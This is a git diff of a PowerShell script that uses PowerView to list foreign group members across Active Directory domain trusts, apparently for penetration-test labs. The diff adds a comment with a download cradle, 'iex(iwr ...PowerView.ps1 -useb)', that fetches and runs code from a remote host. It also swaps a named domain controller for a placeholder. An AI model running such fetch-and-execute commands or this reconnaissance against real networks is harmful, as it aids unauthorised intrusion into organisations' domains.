@@ -1,4 +1,4 @@
-# We need to load PowerView before running this script
+# We need to load PowerView before running this script - iex(iwr http://192.168.45.195/PowerView.ps1 -useb)
 # Make sure to change the -DomainController flag value to your Domain's DC.
 
 function Get-ForeignGroupMembers {
@@ -16,7 +16,7 @@ function Get-ForeignGroupMembers {
 
                 try {
                     # Get foreign group members for the trusted domain
-                    $foreignGroupMembers = Get-DomainForeignGroupMember -Domain $trustedDomain -DomainController dmzdc01.complyedge.com
+                    $foreignGroupMembers = Get-DomainForeignGroupMember -Domain $trustedDomain -DomainController <CHANGE ME>
 
                     if ($foreignGroupMembers) {
                         Write-Host "Found foreign group members in ${trustedDomain}:"
